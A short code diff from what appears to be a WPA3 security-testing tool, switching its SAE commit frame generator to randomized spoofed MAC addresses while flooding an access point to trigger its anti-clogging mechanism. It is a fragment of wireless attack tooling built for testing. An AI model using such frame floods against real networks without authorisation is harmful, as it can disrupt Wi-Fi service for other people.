@@ -104,7 +104,7 @@ namespace wpa3_tester::pmk_gobbler {
 
         log(LogLevel::INFO, "Triggering ACM (max %d frames)...", trigger_count);
         for (int i = 0; i < trigger_count; ++i) {
-            auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_ath_masker_mac(att_mac)), sae_params);
+            auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(att_mac)), sae_params);
             sender.send(frame);
 
             const auto deadline = steady_clock::now() + milliseconds(5);
@@ -148,7 +148,7 @@ namespace wpa3_tester::pmk_gobbler {
                 if (store.queue.empty()) {
                     this_thread::sleep_for(milliseconds(10));
                     //FIXME mají se doplňovat?
-                    auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_ath_masker_mac(sta_mac)), sae_params);
+                    auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(sta_mac)), sae_params);
                     sender.send(frame);
                     continue;
                 }
